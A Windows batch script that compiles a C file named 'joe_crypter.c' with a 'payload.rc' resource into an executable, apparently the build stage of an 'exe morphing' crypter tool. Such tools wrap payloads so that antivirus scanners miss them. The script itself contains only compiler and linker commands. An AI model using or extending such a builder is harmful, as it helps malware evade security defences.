@echo off
color 17
set PellesCDir=G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\compiler
set PATH=%PellesCDir%\Bin;%PATH%
set INCLUDE=%PellesCDir%\Include;%PellesCDir%\Include\Win;%INCLUDE%
set LIB=%PellesCDir%\Lib;%PellesCDir%\Lib\Win;%LIB%
pocc.exe -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze "G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\builder\joe_crypter.c" -Fo"G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\builder\joe_crypter.obj"
porc.exe "G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\builder\payload.rc" -Fo"G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\builder\payload.res"
polink.exe -subsystem:windows -machine:X86 -largeaddressaware -base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:"G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\output_dir\gogopowerrangers.exe" "G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\builder\joe_crypter.obj" "G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\builder\payload.res"


echo Payload sucessfully built and saved to G:\C Projects\Visual Studio\Projects\Exe_Morphing_Util\Exe_Morphing_Util\bin\Debug\output_dir\gogopowerrangers.exe
pause
